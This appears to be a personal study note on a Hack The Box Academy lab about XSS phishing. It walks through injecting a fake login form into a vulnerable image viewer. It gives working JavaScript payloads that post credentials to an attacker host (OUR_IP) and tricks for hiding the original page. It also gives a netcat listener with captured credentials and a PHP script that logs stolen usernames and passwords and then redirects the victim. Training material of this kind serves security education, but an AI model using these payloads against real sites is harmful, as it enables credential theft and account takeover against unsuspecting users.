
***
###### `Title :- Phishing`
###### `Created on :- 2023-06-12 - 07:21`
###### `Created by:- Prem J`
***

- Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker.
- A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.

#### `XSS Discovery -->`

- We start by attempting to find the XSS vulnerability in the web application at `/phishing` from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_image_viewer.jpg)

- This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the `dead image url` icon:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_alert.jpg)

- So, we must run the [[XSS Discovery]] process we previously learned to find a working XSS payload. `Before you continue, try to find an XSS payload that successfully executes JavaScript code on the page`.

#### `Login Form Injection -->`

- Once we identify a working XSS payload, we can proceed to the phishing attack.
- To perform an XSS phishing attack, we must ***inject an HTML*** code that displays a login form on the targeted page. This form should ***send the login information to a server we are listening on***, such that once a user attempts to log in, we'd get their credentials.

>[!Note]
>The default port used is 80, if that port is being is used we can change it in the payload and listen on that specific payload

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP:OUR_PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

- A JavaScript function that injects HTML code of a simple login form into a vulnerable web server.
- In this case, we are exploiting a `Reflected XSS` vulnerability, so we can ***copy the URL and our XSS payload in its parameters***, as we've done in the `Reflected XSS` section, and the page should look as follows when we visit the malicious URL:

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form.jpg)

#### `Cleaning up -->`

- upon observation we can find the url field is still present, to remove it we can use the JavaScript function `document.getElementById().remove()`.

```javascript
document.getElementById('urlform').remove();
```

- upon adding this to the payload and injecting it we get the results like:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_2.jpg)

- We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload `<!--`

![](https://academy.hackthebox.com/storage/modules/103/xss_phishing_injected_login_form_3.jpg)

- At this stage we have perfected the payload. Now we can send it to the victim and trick him into using fake login form.

#### `Credential Stealing -->`

- If you tried to log into the injected login form, you would probably get the error `This site can’t be reached`. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a `site can’t be reached` error.
- we can use **netcat** for listening over a port

`sudo nc -lnvp 80` --> listens over the port 80

- Now when our victim logs into the injected HTML page we will receive his credentials

```shell-session
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

- However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions

>[!Note]
>We can use PHP scripts that logs the credentials from the HTTP request and then returns the victim to original page. The victim thinks he logged into the page successfully. 

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

- Now that we have our `index.php` file ready, we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener we used earlier

```shell-session
premjampuram@htb[/htb]$ mkdir /tmp/tmpserver
premjampuram@htb[/htb]$ cd /tmp/tmpserver
premjampuram@htb[/htb]$ vi index.php #at this step we wrote our index.php file
premjampuram@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

